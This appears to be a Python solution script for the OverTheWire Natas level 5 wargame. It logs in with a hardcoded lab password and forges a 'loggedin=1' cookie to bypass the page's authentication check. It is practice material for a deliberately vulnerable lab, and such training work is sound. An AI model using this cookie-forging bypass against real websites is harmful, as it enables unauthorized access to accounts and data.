#!/usr/bin/python3

import requests

url = 'http://natas5.natas.labs.overthewire.org/'
auth = ('natas5', 'Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD')

r = requests.get(url=url, auth=auth)
print(r.cookies)

cookies = {"loggedin":"1"}
r = requests.get(url=url, auth=auth, cookies=cookies)
print(r.text)
